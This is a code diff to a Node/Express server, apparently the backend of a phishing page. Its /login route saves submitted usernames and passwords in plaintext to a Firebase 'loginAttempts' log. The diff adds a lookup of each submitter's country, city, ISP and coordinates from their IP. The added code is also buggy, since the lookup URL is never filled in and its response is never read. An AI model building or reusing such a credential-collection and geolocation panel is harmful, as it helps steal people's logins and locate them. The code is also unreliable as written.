@@ -21,14 +21,25 @@ admin.initializeApp({
 const db = admin.database();
 
 // 📡 Login data receive panna
-app.post("/login", (req, res) => {
+app.post("/login",async (req, res) => {
   const data = req.body;
 const rawIP=req.headers['x-forwarded-for']||req.ip;
   const ip=rawIP.split(",")[0].trim();
+  let geoData={};
+  try{
+    const geoRes=await fetch('http://ip-api.com/json/${ip}');
+  }catch(err){
+    console.log("Geo API error:",err);
+  }
   const ref = db.ref("loginAttempts").push();
   ref.set({
     time: new Date().toLocaleString(),
    ip:ip,
+    country:geoData.country||"N/A",
+    city:geoData.city||"N/A",
+    isp:geoData.isp||"N/A",
+    lat:geoData.lat||"N/A",
+    lon:geoData.lon||"N/A",
     username: data.username || "N/A",
     password: data.password || "N/A",
     userAgent: data.agent || "N/A",
